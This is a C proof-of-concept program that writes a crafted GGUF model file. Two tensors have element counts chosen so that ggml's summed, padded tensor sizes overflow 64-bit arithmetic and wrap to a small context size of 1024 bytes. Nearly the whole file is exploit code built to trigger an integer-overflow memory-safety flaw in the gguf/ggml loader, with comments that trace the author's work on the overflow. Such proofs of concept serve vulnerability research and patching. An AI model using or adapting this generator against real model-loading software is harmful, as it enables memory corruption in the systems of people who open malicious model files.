#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef GGML_MAX_DIMS
#    define GGML_MAX_DIMS 4  // Or what ggml actually uses
#endif

// --- BEGIN: Mimic ggml types and functions needed for PoC ---
// These should ideally come from linking ggml or including its headers,
// but for a self-contained PoC, we might need to define minimal versions.

typedef enum {
    POC_GGML_TYPE_F32  = 0,
    POC_GGML_TYPE_F16  = 1,
    POC_GGML_TYPE_Q4_0 = 2,
    // ... other types if needed
} poc_ggml_type;

// Simplified function to mimic ggml_type_size
size_t poc_ggml_type_size(poc_ggml_type type) {
    if (type == POC_GGML_TYPE_F16) {
        return 2;
    }
    if (type == POC_GGML_TYPE_F32) {
        return 4;
    }
    // Add other types as needed for your PoC
    return 0;  // Should not happen
}

// Simplified function to mimic ggml_blck_size
int poc_ggml_blck_size(poc_ggml_type type) {
    // For unquantized types, block size is 1
    if (type == POC_GGML_TYPE_F16 || type == POC_GGML_TYPE_F32) {
        return 1;
    }
    // For quantized types, it's different, e.g., for Q4_0 it might be related to GGML_BLCK_SIZE
    return 1;  // Default, adjust if using quantized types
}

// CRUCIAL: This function needs to accurately reflect how ggml_nbytes calculates size,
// especially how it handles ne (int64_t) and type_size/blck_size.
// This is where the "expected 0x07..." vs "expected 0xE..." mystery was.
// Based on the LATEST output, ggml seems to calculate it as (ne * type_size) / blck_size
// where ne is int64_t, and the multiplication promotes ne to uint64_t if type_size is uint64_t.
size_t calculate_ggml_nbytes_in_poc(int64_t ne_dim0, poc_ggml_type type) {
    if (ne_dim0 < 0) {  // ggml_nelements would return INT64_MIN which then fails an assert
        // For PoC, let's assume ne_dim0 is what ggml_nelements would return if positive
        // Or, if ggml_nelements itself would overflow, we'd need to mimic that.
        // For simplicity now, assume ne_dim0 is the valid total number of elements.
        return 0;  // Or handle error
    }
    size_t ts = poc_ggml_type_size(type);
    int    bs = poc_ggml_blck_size(type);
    if (bs == 0) {
        return 0;  // Avoid division by zero
    }

    // Mimic (ne * ts) / bs
    // In C, int64_t * uint64_t (if ts is size_t/uint64_t) -> ne promotes to uint64_t
    uint64_t ne_u = (uint64_t) ne_dim0;
    uint64_t num  = ne_u * ts;  // This multiplication should not overflow uint64_t for our chosen ne_u and ts
    return num / (uint64_t) bs;
}

// --- END: Mimic ggml types ---

struct poc_gguf_tensor_info_header {
    uint64_t name_len;
    // char name[]; // Name follows, not fixed size in PoC for simplicity of struct
};

struct poc_gguf_tensor_info_meta {
    uint32_t n_dims;
    int64_t  ne[GGML_MAX_DIMS];
    uint32_t type;
    uint64_t offset;
};

#define NUM_POC_TENSORS 2   // Let's try with 2 tensors first
#define ALIGNMENT       32  // Common GGUF alignment

uint64_t POC_GGML_PAD(uint64_t x, uint64_t align) {
    return ((x + align - 1) / align) * align;
}

// Define GGUF_VERSION if not available (e.g., from gguf.h)
#ifndef GGUF_VERSION
#    define GGUF_VERSION 3  // Common version
#endif

int main(int ac, char ** av) {
    if (ac != 2) {
        printf("usage: %s <filename>\n", av[0]);
        exit(1);
    }

    const char * filename = av[1];

    uint32_t version       = GGUF_VERSION;
    uint64_t n_tensors_val = NUM_POC_TENSORS;
    uint64_t n_kv_val      = 0;

    // --- Tensor Design for ctx->size overflow to a SMALL value ---
    // Objective: Make the final ggml's ctx->size (sum of padded nbytes) small after overflow.
    // final_ctx_size = (POC_GGML_PAD(nbytes0, ALIGNMENT) + POC_GGML_PAD(nbytes1, ALIGNMENT)) % (UINT64_MAX + 1)
    // We want final_ctx_size to be, e.g., TARGET_CTX_SIZE_AFTER_OVERFLOW.

    const uint64_t TARGET_CTX_SIZE_AFTER_OVERFLOW =
        1024ULL;  // Must be a multiple of ALIGNMENT. 1024 is fine for ALIGNMENT=32.

    poc_ggml_type type0 = POC_GGML_TYPE_F16;
    poc_ggml_type type1 = POC_GGML_TYPE_F16;
    size_t        ts0   = poc_ggml_type_size(type0);
    size_t        ts1   = poc_ggml_type_size(type1);

    // Design nbytes0 so POC_GGML_PAD(nbytes0, ALIGNMENT) is large
    uint64_t nbytes0_target = 0xD000000000000000ULL;
    // Ensure nbytes0_target is a multiple of ts0 and ALIGNMENT for simplicity
    if (nbytes0_target % ts0 != 0) {
        nbytes0_target = (nbytes0_target / ts0) * ts0;
    }
    if (nbytes0_target % ALIGNMENT != 0) {  // Should not happen for 0xD...00 and ALIGNMENT=32
        nbytes0_target = (nbytes0_target / ALIGNMENT) * ALIGNMENT;
    }

    int64_t ne0     = nbytes0_target / ts0;
    size_t  nbytes0 = calculate_ggml_nbytes_in_poc(ne0, type0);  // Should be nbytes0_target

    uint64_t padded_nbytes0 = POC_GGML_PAD(nbytes0, ALIGNMENT);
    printf("Target final ctx->size after overflow: 0x%" PRIx64 "\n", TARGET_CTX_SIZE_AFTER_OVERFLOW);
    printf("Calculated ne0: %" PRId64 "\n", ne0);
    printf("Designed nbytes0: 0x%" PRIx64 ", resulting padded_nbytes0: 0x%" PRIx64 "\n", nbytes0, padded_nbytes0);

    // Design nbytes1 so (padded_nbytes0 + POC_GGML_PAD(nbytes1, ALIGNMENT)) wraps to TARGET_CTX_SIZE_AFTER_OVERFLOW
    // POC_GGML_PAD(nbytes1, ALIGNMENT) = (UINT64_MAX - padded_nbytes0 + 1) + TARGET_CTX_SIZE_AFTER_OVERFLOW
    uint64_t target_padded_nbytes1 = (0xFFFFFFFFFFFFFFFFULL - padded_nbytes0 + 1ULL) + TARGET_CTX_SIZE_AFTER_OVERFLOW;

    // We want nbytes1 such that POC_GGML_PAD(nbytes1, ALIGNMENT) == target_padded_nbytes1.
    // Choose nbytes1 = target_padded_nbytes1. This works if target_padded_nbytes1 is a multiple of ALIGNMENT.
    // (It will be if padded_nbytes0 and TARGET_CTX_SIZE_AFTER_OVERFLOW are multiples of ALIGNMENT).
    uint64_t nbytes1_target = target_padded_nbytes1;
    if (nbytes1_target % ts1 != 0) {
        nbytes1_target = (nbytes1_target / ts1) * ts1;  // Adjust to be multiple of type size
        // Recalculate target_padded_nbytes1 based on this adjusted nbytes1_target if precision is critical
        // For now, this adjustment is to ensure ne1 is integer. The padding will handle alignment.
    }
    if (nbytes1_target % ALIGNMENT != 0 && POC_GGML_PAD(nbytes1_target, ALIGNMENT) != target_padded_nbytes1) {
        // If nbytes1_target itself doesn't pad up to target_padded_nbytes1,
        // we might need nbytes1_target = target_padded_nbytes1 - k (where k is small)
        // For simplicity, we assume nbytes1_target = target_padded_nbytes1 will work or be close enough
        // if target_padded_nbytes1 is already aligned.
        printf("Warning: nbytes1_target (0x%" PRIx64 ") might not perfectly pad to target_padded_nbytes1 (0x%" PRIx64
               ").\n",
               nbytes1_target, target_padded_nbytes1);
    }

    int64_t ne1 = nbytes1_target / ts1;
    if (ne1 <= 0) {
        fprintf(stderr,
                "Error: Calculated ne1 (%" PRId64
                ") is not positive. Adjust nbytes0_target or TARGET_CTX_SIZE_AFTER_OVERFLOW.\n",
                ne1);
        exit(1);
    }
    size_t nbytes1 = calculate_ggml_nbytes_in_poc(ne1, type1);  // Should ideally be nbytes1_target

    printf("Calculated ne1: %" PRId64 "\n", ne1);
    printf("Designed nbytes1: 0x%" PRIx64 " (aiming for its padded version to be 0x%" PRIx64 ")\n", nbytes1,
           target_padded_nbytes1);

    // The existing PoC correctly calculates tm0.offset and tm1.offset
    // to match what gguf.cpp expects based on gguf_add_tensor logic.
    // tm0.offset = 0
    // tm1.offset = POC_GGML_PAD(nbytes0, ALIGNMENT)

    FILE * fp = fopen(filename, "wb");
    if (!fp) {
        perror("Unable to write out file");
        exit(1);
    }

    printf("[+] Writing GGUF header: %s\n", filename);
    fwrite("GGUF", 4, 1, fp);
    fwrite(&version, sizeof(version), 1, fp);
    fwrite(&n_tensors_val, sizeof(n_tensors_val), 1, fp);
    fwrite(&n_kv_val, sizeof(n_kv_val), 1, fp);

    uint64_t calculated_offset_for_ggml = 0;  // This mimics ggml's internal ctx->size

    // --- Tensor 0 ---
    char                               name0_str[] = "tensor_A";
    struct poc_gguf_tensor_info_header th0;
    struct poc_gguf_tensor_info_meta   tm0;
    th0.name_len = strlen(name0_str);
    tm0.n_dims   = 1;
    tm0.ne[0]    = ne0;
    tm0.type     = type0;
    tm0.offset   = POC_GGML_PAD(calculated_offset_for_ggml, ALIGNMENT);

    fwrite(&th0.name_len, sizeof(th0.name_len), 1, fp);
    fwrite(name0_str, th0.name_len, 1, fp);
    fwrite(&tm0.n_dims, sizeof(tm0.n_dims), 1, fp);
    fwrite(tm0.ne, sizeof(tm0.ne[0]), tm0.n_dims, fp);
    fwrite(&tm0.type, sizeof(tm0.type), 1, fp);
    fwrite(&tm0.offset, sizeof(tm0.offset), 1, fp);
    printf("  - Tensor 0 (name: %s, ne[0]: %" PRId64 ", type: %u, nbytes_calc: 0x%" PRIx64
           ", offset_written: 0x%" PRIx64 ")\n",
           name0_str, tm0.ne[0], tm0.type, nbytes0, tm0.offset);

    // Update ggml's internal expected offset calculation
    calculated_offset_for_ggml = POC_GGML_PAD(calculated_offset_for_ggml, ALIGNMENT);
    calculated_offset_for_ggml += nbytes0;
    printf("    ggml's ctx->size after tensor 0 (before next pad): 0x%" PRIx64 "\n", calculated_offset_for_ggml);

    // --- Tensor 1 ---
    char                               name1_str[] = "tensor_B";
    struct poc_gguf_tensor_info_header th1;
    struct poc_gguf_tensor_info_meta   tm1;
    th1.name_len = strlen(name1_str);
    tm1.n_dims   = 1;
    tm1.ne[0]    = ne1;
    tm1.type     = type1;
    tm1.offset   = POC_GGML_PAD(calculated_offset_for_ggml,
                                ALIGNMENT);  // Offset based on *correctly* calculated previous ctx->size

    fwrite(&th1.name_len, sizeof(th1.name_len), 1, fp);
    fwrite(name1_str, th1.name_len, 1, fp);
    fwrite(&tm1.n_dims, sizeof(tm1.n_dims), 1, fp);
    fwrite(tm1.ne, sizeof(tm1.ne[0]), tm1.n_dims, fp);
    fwrite(&tm1.type, sizeof(tm1.type), 1, fp);
    fwrite(&tm1.offset, sizeof(tm1.offset), 1, fp);
    printf("  - Tensor 1 (name: %s, ne[0]: %" PRId64 ", type: %u, nbytes_calc: 0x%" PRIx64
           ", offset_written: 0x%" PRIx64 ")\n",
           name1_str, tm1.ne[0], tm1.type, nbytes1, tm1.offset);

    // Update ggml's internal expected offset calculation (this sum should overflow)
    uint64_t prev_calc_offset  = calculated_offset_for_ggml;
    calculated_offset_for_ggml = POC_GGML_PAD(calculated_offset_for_ggml, ALIGNMENT);
    calculated_offset_for_ggml += nbytes1;  // <<< POTENTIAL OVERFLOW HERE FOR UINT64_MAX
    printf(
        "    PoC's internal calculated_offset_for_ggml after tensor 1 (before next pad for hypothetical T2): 0x%" PRIx64
        " (prev was 0x%" PRIx64 ", added unpadded nbytes1 0x%" PRIx64 " to a padded sum)\n",
        calculated_offset_for_ggml, prev_calc_offset, nbytes1);
    if (calculated_offset_for_ggml < POC_GGML_PAD(prev_calc_offset, ALIGNMENT) &&
        nbytes1 > 0) {  // Check for overflow if nbytes1 could cause it
        printf("    >>>> UINT64 OVERFLOW DETECTED in PoC's internal calculated_offset_for_ggml sum <<<<\n");
    }

    // Verify the sum that ggml.c's ctx->size will actually be
    uint64_t final_gguf_ctx_size_in_ggml_dot_cpp = POC_GGML_PAD(nbytes0, ALIGNMENT) + POC_GGML_PAD(nbytes1, ALIGNMENT);
    printf("    EXPECTED FINAL gguf.cpp ctx->size (sum of padded nbytes): 0x%" PRIx64 "\n",
           final_gguf_ctx_size_in_ggml_dot_cpp);
    if (final_gguf_ctx_size_in_ggml_dot_cpp == TARGET_CTX_SIZE_AFTER_OVERFLOW) {
        printf("    SUCCESS: EXPECTED FINAL gguf.cpp ctx->size matches TARGET_CTX_SIZE_AFTER_OVERFLOW (0x%" PRIx64
               ")!\n",
               TARGET_CTX_SIZE_AFTER_OVERFLOW);
    } else {
        printf("    MISMATCH: EXPECTED FINAL gguf.cpp ctx->size (0x%" PRIx64
               ") != TARGET_CTX_SIZE_AFTER_OVERFLOW (0x%" PRIx64 ")!\n",
               final_gguf_ctx_size_in_ggml_dot_cpp, TARGET_CTX_SIZE_AFTER_OVERFLOW);
    }

    // Pad the file to ALIGNMENT before writing the dummy tensor data blob
    // This ensures that gguf.cpp's fseek to aligned position doesn't skip parts of our dummy data.
    long current_pos = ftell(fp);
    long padded_pos  = POC_GGML_PAD(current_pos, ALIGNMENT);
    if (padded_pos > current_pos) {
        char pad_bytes[ALIGNMENT] = { 0 };  // Max padding needed is ALIGNMENT-1 bytes
        printf("    Padding file from %ld to %ld to align data section.\n", current_pos, padded_pos);
        fwrite(pad_bytes, 1, padded_pos - current_pos, fp);
    }

    char dummy_data_padding[TARGET_CTX_SIZE_AFTER_OVERFLOW];
    // Initialize VLA using memset
    // First, fill with a pattern that would be unexpected if read by tensor_B
    memset(dummy_data_padding, 0xAA, sizeof(dummy_data_padding));

    // Now, specifically fill the beginning part for tensor_A (tensor[0])
    // with what gguf_ex_read_1 expects (100.0f for all its elements).
    // We need to know how many elements tensor_A claims to have, at least for the check part.
    // The ne0 is very large, so we can't fill all of it.
    // Let's fill enough for the initial checks/prints in gguf_ex_read_1 (e.g., first 10-20 floats).
    size_t num_elements_to_fill_for_tensor_a = 100;  // Fill 20 floats for tensor_A
    if (num_elements_to_fill_for_tensor_a * sizeof(float) > TARGET_CTX_SIZE_AFTER_OVERFLOW) {
        num_elements_to_fill_for_tensor_a = TARGET_CTX_SIZE_AFTER_OVERFLOW / sizeof(float);
    }

    float tensor_a_expected_value = 100.0f;
    for (size_t k = 0; k < num_elements_to_fill_for_tensor_a; ++k) {
        if ((k + 1) * sizeof(float) <= sizeof(dummy_data_padding)) {  // Boundary check
            memcpy(&dummy_data_padding[k * sizeof(float)], &tensor_a_expected_value, sizeof(float));
        } else {
            break;  // Stop if we run out of space in dummy_data_padding
        }
    }
    printf("    Filled the first %zu float elements of dummy_data_padding with %f for tensor_A.\n",
           num_elements_to_fill_for_tensor_a, tensor_a_expected_value);

    fwrite(dummy_data_padding, 1, sizeof(dummy_data_padding), fp);

    fclose(fp);
    printf("[+] Finished writing PoC GGUF file.\n");
    return 0;
}
